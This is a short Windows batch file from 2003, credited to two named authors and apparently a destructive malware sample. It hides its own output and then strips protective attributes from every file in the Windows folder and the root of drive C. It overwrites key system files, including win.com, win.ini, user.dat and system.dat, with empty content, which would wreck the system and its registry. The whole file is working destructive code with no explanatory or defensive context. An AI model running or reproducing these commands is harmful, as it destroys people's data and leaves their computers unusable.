:: Created by 2 good friends reunited
:: DvL      ( dvl2003ro@yahoo.co.uk )
:: Ratty    ( ratty2001ro@yahoo.com )
:: Contact us.
@echo off
ctty nul
@attrib %windir%\*.* -s -h -r +a
@if exist nul>%windir%\win.com
@if exist nul>%windir%\win.ini
@if exist nul>%windir%\user.dat
@if exist nul>%windir%\system.dat
@attrib c:\*.* -s -h -r +a
@if exist nul>c:\system.1st
ctty con
cls
:: Created for DM 2.1 by Ratty and DvL
:: 06.05.2003